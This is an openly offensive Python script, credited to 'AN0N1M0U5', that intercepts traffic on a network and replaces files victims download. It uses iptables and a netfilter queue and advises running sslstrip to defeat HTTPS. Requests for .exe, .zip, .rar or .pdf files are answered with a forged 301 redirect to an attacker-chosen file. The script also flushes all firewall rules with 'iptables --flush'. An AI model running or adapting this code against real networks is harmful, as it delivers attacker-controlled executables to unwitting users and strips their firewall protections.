#!/usr/bin/env python

import netfilterqueue
import scapy.all as scapy
import os

print("This script is created by AN0N1M0U5\nReplacing downloaded files with files of your choice!")
print("\n")
print("RUN SSLSTRIP IN NEW TERMINAL TO BYPASS HTTPS")
print("\n\n")

os.system("iptables --flush")
os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
os.system("iptables -I OUTPUT -j NFQUEUE --queue-num 0")
os.system("iptables -I INPUT -j NFQUEUE --queue-num 0")
os.system("iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000")

url_test = raw_input("Replace with file (http://192.168.0.1/test.exe): ")

ack_list = []
def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.Raw):
        if scapy_packet[scapy.TCP].dport == 10000: #80 for no ssl
            type_list = [".exe", ".zip", ".rar", ".pdf"]
            for i in type_list:
                if i in scapy_packet[scapy.Raw].load:
                    print("[+] "+i+" Request")
                    ack_list.append(scapy_packet[scapy.TCP].ack)
                    break
        elif scapy_packet[scapy.TCP].sport == 10000:
            if scapy_packet[scapy.TCP].seq in ack_list:
                ack_list.remove(scapy_packet[scapy.TCP].seq)
                print("[+] Replaceing file")
                scapy_packet[scapy.Raw].load = "HTTP/1.1 301 Moved Permanently\nLocation: {}\n\n".format(url_test)
                del scapy_packet[scapy.IP].len
                del scapy_packet[scapy.IP].chksum
                del scapy_packet[scapy.TCP].chksum
                packet.set_payload(str(scapy_packet))
       

    packet.accept()

try:
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    os.system("iptables --flush")
    print("[+] Stopped Download replacing")
